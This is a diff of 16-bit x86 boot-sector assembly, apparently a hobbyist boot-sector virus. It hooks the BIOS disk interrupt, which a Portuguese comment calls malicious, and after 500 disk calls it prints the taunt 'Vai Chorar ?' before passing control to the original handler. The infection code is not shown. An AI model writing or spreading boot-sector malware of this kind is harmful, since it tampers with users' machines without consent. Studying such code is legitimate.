@@ -1,6 +1,14 @@
 [BITS 16]
 [ORG 0x7c00]
 
+DriverID db 0
+
+disks:
+    db 0x00 ; 1st flp
+    db 0x01 ; 2nd flp
+    db 0x80 ; Referência: -- typically 0x80 for the "C" drive 
+    db 0x81 ; 2nd HD
+
 start:
     cli                           ; no interrupt zone
     mov byte [DriverID], dl
@@ -125,33 +133,43 @@ interrupt:
     ; CODIGO DE INTERRUPÇÂO MALICIOSO!
     pusha
     mov ah, 0x0E
-    mov al, [cs:msg-transfer_bytes]
-    int 10h
 
-
-    popa
+    mov dx, [cs:kio_counter-transfer_bytes]
     
-    push word [cs:current_int13-transfer_bytes+2] ; segment    
-    push word [cs:current_int13-transfer_bytes]   ; offset    
+    inc dx
+    cmp dx, 500
     
-    retf ; Da um pop no IP e no CS (code segment)
+    jl interrupt_end
 
+    mov word [cs:kio_counter-transfer_bytes], 0
+    xor di, di
+    letter_by_letter:
 
+        mov al, [cs:msg-transfer_bytes+di]
+        int 10h
+        inc di
+
+        cmp di, msg_len
+        jle letter_by_letter
+
+    interrupt_end:
+        mov word [cs:kio_counter-transfer_bytes], dx
+
+        popa
+        
+        push word [cs:current_int13-transfer_bytes+2] ; segment    
+        push word [cs:current_int13-transfer_bytes]   ; offset    
+        
+        retf ; Da um pop no IP e no CS (code segment)
+
+kio_counter: dd 0
 current_int13:
     dd 0xDEADBEEF ; O beef morto esta sempre presente em nossas vidas!
 
-msg:
-    db "Vai Chorar ?"
+msg db "Vai Chorar ?"
+msg_len equ $-msg
 ; FIM do transfer_bytes
 transfer_end:
-
-DriverID db 0
-
-disks:
-    db 0x00 ; 1st flp
-    db 0x01 ; 2nd flp
-    db 0x80 ; Referência: -- typically 0x80 for the "C" drive 
-    db 0x81 ; 2nd HD
 
 db "Qual o proposito de existência humana?(ಥ _ ಥ)"
 
